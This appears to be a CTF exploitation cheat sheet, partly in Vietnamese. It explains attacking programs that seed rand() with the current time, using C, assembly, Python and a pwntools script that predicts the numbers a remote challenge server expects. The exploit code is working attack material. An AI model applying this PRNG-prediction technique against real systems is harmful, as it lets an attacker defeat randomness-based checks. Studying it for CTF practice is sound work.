# Other Attack

- &environ
- fini_array
- rtld_global
- OTHER LOGIC BUG: seed, permission, ...
    * __RANDOM => seed__: dùng seed có giá trị là thời gian thực lúc chạy chương trình, vì vậy tạo 1 script chạy cùng là xong

    * Nhiệm vụ của srand(x) đưa ra seed x rồi rand() dựa vào x đưa ra số a. Khi đó a là seed cho lần gọi rand() tiếp theo (cứ như thế tiếp tục). Do vậy VD trong vòng lặp thời gian 1 giây rand() dùng seed cũ liên tục nên nó không bao giờ ra số khác nhau trong khoảng thời gian đó.

    * VD: [Meshuggah](https://qbao.home.blog/2020/04/30/start-to-pwnb01lers-ctf/) .
    ```asm
    asm:
        mov edi, 0      ; time
        call _time
        add eax, 2
        mov edi, eax    ; seed
        call _srand
    ```

    ```C
    int main(){
        int seed = time(0) + 2;
        srand(seed);
        for(int i = 0; i < 100; i++)
            printf("%d\n", rand());
        return 0;
    }
    ```

    ```python
    from ctypes import CDLL
    from ctypes.util import find_library

    libc = CDLL(find_library("c"))

    libc.srand(0x5a35b162)
    print(libc.rand(), libc.rand(), libc.rand())
    ```
```python
#!/usr/bin/env python3
from pwn import *
import random
import time
import calendar
import datetime
from ctypes import *
import random
elf = ELF("./random")
libc = CDLL("/usr/lib/x86_64-linux-gnu/libc.so.6")
# p = elf.process()
p = remote("challs.tfcctf.com", "32615")
context.update(binary=elf, log_level="DEBUG")
# gdb.attach(p, '''
# 	b *vuln
# 	''')

current_GMT = time.gmtime()
time_stamp = calendar.timegm(current_GMT)
libc.srand(time_stamp)
print(p.recvline())
for i in range(10):
    number = libc.rand()
    p.sendline(str(number).encode())


p.interactive()
```

